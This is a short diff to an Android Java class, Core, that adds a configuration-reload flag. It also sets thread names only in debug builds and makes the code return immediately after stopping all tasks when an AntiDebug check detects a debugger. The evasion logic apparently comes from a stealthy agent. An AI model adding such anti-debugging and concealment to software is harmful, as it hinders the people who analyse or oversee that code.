@@ -76,6 +76,7 @@ public class Core extends Activity implements Runnable {
 	private CheckAction checkActionFast;
 	private PendingIntent alarmIntent = null;
 	private ServiceMain serviceMain;
+	private boolean reload = false;
 
 	@SuppressWarnings("unused")
 	private void Core() {
@@ -327,7 +328,9 @@ public class Core extends Activity implements Runnable {
 		private final int queue;
 
 		CheckAction(int queue) {
-			Thread.currentThread().setName("queue_" + queue);
+			if (Cfg.DEBUG) {
+				Thread.currentThread().setName("queue_" + queue);
+			}
 			this.queue = queue;
 		}
 
@@ -376,6 +379,7 @@ public class Core extends Activity implements Runnable {
 					AntiDebug ad = new AntiDebug();
 					if (ad.isDebug()) {
 						stopAll();
+						return true;
 					}
 				}
 
@@ -812,16 +816,25 @@ public class Core extends Activity implements Runnable {
 
 	}
 
+	public synchronized void reload() {
+		this.reload = true;
+	}
+
+	public synchronized boolean wantsReload() {
+		return reload;
+	}
+
 	public synchronized boolean reloadConf() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
 		}
 
-		if (verifyNewConf()) {
+		if (verifyNewConf() || reload) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
-
+			
+			reload = false;
 			stopAll();
 
 			int ret = taskInit();
